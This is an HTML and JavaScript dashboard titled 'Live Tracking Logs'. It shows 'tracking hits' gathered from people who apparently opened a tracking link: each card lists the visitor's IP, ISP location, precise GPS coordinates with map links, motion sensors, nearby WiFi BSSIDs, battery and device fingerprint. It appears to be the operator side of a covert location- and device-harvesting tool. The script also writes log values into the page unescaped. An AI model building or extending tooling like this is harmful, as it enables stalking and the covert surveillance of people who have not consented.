<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking Logs</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --card-bg: #161b22;
            --text-color: #c9d1d9;
            --accent: #58a6ff;
            --border: #30363d;
            --success: #238636;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        h1 {
            border-bottom: 1px solid var(--border);
            padding-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        button {
            background-color: var(--success);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            opacity: 0.9;
        }

        .log-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .card {
            background-color: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 15px;
            overflow: hidden;
        }

        .card-header {
            font-size: 0.9em;
            color: var(--accent);
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #30363d;
            padding-bottom: 5px;
        }

        .section-title {
            font-size: 0.8em;
            text-transform: uppercase;
            color: #8b949e;
            margin-top: 10px;
            margin-bottom: 4px;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #21262d;
        }

        .data-row {
            margin-bottom: 8px;
            font-size: 0.85em;
            word-break: break-all;
        }

        .label {
            font-weight: bold;
            color: #8b949e;
            display: inline-block;
            width: 80px;
        }

        a {
            color: #58a6ff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>
            <span>üõ∞Ô∏è Live Tracking Logs</span>
            <button onclick="fetchLogs()">Refresh</button>
        </h1>
        <div id="log-container" class="log-grid">
            Loading...
        </div>
    </div>

    <script>
        async function fetchLogs() {
            const container = document.getElementById('log-container');
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();

                if (!data.success || !data.logs) {
                    container.innerHTML = '<div>No logs found on server.</div>';
                    return;
                }

                // Parse the raw text log
                const rawLogs = data.logs.split('-----------------------------').filter(l => l.trim().length > 0).reverse();

                container.innerHTML = rawLogs.map(logBlock => {
                    const lines = logBlock.trim().split('\n');
                    let entry = { raw: logBlock };

                    // Parsing Logic
                    lines.forEach(line => {
                        if (line.includes('TRACKING HIT')) entry.time = line.split(' - ')[1];
                        if (line.startsWith('IP USED:')) entry.ip = line.split(': ')[1];
                        if (line.startsWith('LOCATION:')) entry.location = safeJSON(line.substring(9));
                        if (line.startsWith('GPS:')) entry.gps = safeJSON(line.substring(4));
                        if (line.startsWith('SENSORS:')) entry.sensors = safeJSON(line.substring(8));
                        if (line.startsWith('CLIENT DATA:')) entry.client = safeJSON(line.substring(12));
                        if (line.startsWith('WIFI:')) entry.wifi = safeJSON(line.substring(5));
                        if (line.startsWith('FINGERPRINT:')) entry.fingerprint = safeJSON(line.substring(12));
                    });

                    return createCard(entry);
                }).join('');

            } catch (e) {
                container.innerHTML = `<div style="color:red">Error fetching logs: ${e.message}</div>`;
            }
        }

        function safeJSON(str) {
            try { return JSON.parse(str); } catch (e) { return str; }
        }

        function createCard(entry) {
            let html = `<div class="card">`;

            // Header
            html += `<div class="card-header">
                        <span>${entry.time || 'Unknown Time'}</span>
                        <span style="color:white">${entry.ip || ''}</span>
                     </div>`;

            // Location (ISP)
            if (entry.location && typeof entry.location === 'object') {
                html += `<div class="section-title">üåç ISP Location</div>`;
                html += `<div class="data-row"><span class="label">City:</span> ${entry.location.city || 'N/A'}, ${entry.location.region || ''}</div>`;
                html += `<div class="data-row"><span class="label">ISP:</span> ${entry.location.org || 'N/A'}</div>`;
                const loc = entry.location.loc || '';
                if (loc) {
                    html += `<div class="data-row"><span class="label">Coords:</span> <a href="https://www.google.com/maps?q=${loc}" target="_blank">${loc}</a></div>`;
                }
            }

            // GPS (Precise)
            if (entry.gps && typeof entry.gps === 'object') {
                // Check if it's a valid GPS object with lat/lng
                const lat = entry.gps.lat || entry.gps.latitude;
                const lng = entry.gps.lng || entry.gps.longitude;

                if (lat && lng) {
                    html += `<div class="section-title" style="color: #ff6b6b; border-color: #ff6b6b;">üéØ GPS (Precise)</div>`;
                    html += `<div class="data-row"><span class="label">Coords:</span> <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#ff6b6b; font-weight:bold;">${lat}, ${lng}</a></div>`;
                    html += `<div class="data-row"><span class="label">Accuracy:</span> ${entry.gps.accuracy || entry.gps.acc || 'N/A'} meters</div>`;
                } else if (entry.gps.error) {
                    html += `<div class="section-title">üéØ GPS</div>`;
                    html += `<div class="data-row"><span class="label">Status:</span> <span style="color: #8b949e;">${entry.gps.error}</span></div>`;
                }
            }

            // Client Data
            if (entry.client && typeof entry.client === 'object') {
                html += `<div class="section-title">üì± Device & Page</div>`;
                html += `<div class="data-row"><span class="label">Viewport:</span> ${entry.client.viewport || 'N/A'}</div>`;
                html += `<div class="data-row"><span class="label">Url:</span> ${entry.client.url ? entry.client.url.split('/').pop() : 'N/A'}</div>`;
            }

            // Sensors
            if (entry.sensors && typeof entry.sensors === 'object') {
                html += `<div class="section-title">üß≠ Sensors</div>`;
                if (entry.sensors.accel) {
                    html += `<div class="data-row"><span class="label">Motion:</span> X:${entry.sensors.accel.x} Y:${entry.sensors.accel.y} Z:${entry.sensors.accel.z}</div>`;
                } else {
                    html += `<div class="data-row"><span class="label">Status:</span> ${entry.sensors.status || 'None'}</div>`;
                }
            }

            // WiFi
            if (entry.wifi && typeof entry.wifi === 'object') {
                html += `<div class="section-title">üì∂ WiFi</div>`;
                if (Array.isArray(entry.wifi)) {
                    // Check if empty array
                    if (entry.wifi.length === 0) {
                        html += `<div class="data-row">No networks found</div>`;
                    } else {
                        entry.wifi.forEach(w => {
                            html += `<div class="data-row">üì° ${w.bssid || 'Unknown'} (${w.signal || '?'}dBm)</div>`;
                        });
                    }
                } else {
                    html += `<div class="data-row">${entry.wifi.status || entry.wifi.error || 'N/A'}</div>`;
                }
            }

            // Fingerprint
            if (entry.fingerprint && typeof entry.fingerprint === 'object') {
                html += `<div class="section-title">üîç Fingerprint</div>`;
                const bat = entry.fingerprint.battery || {};
                html += `<div class="data-row"><span class="label">Battery:</span> ${bat.level ? Math.round(bat.level * 100) + '%' : 'N/A'} ${bat.charging ? '‚ö°' : ''}</div>`;
                html += `<div class="data-row"><span class="label">System:</span> ${entry.fingerprint.platform || 'N/A'} (${entry.fingerprint.cores || '?'} cores)</div>`;
                if (entry.fingerprint.connection && entry.fingerprint.connection !== 'unsupported') {
                    html += `<div class="data-row"><span class="label">Net:</span> ${entry.fingerprint.connection.type || ''} (${entry.fingerprint.connection.downlink || '?'} Mbps)</div>`;
                }
            }

            html += `</div>`;
            return html;
        }

        fetchLogs();
    </script>
</body>

</html>
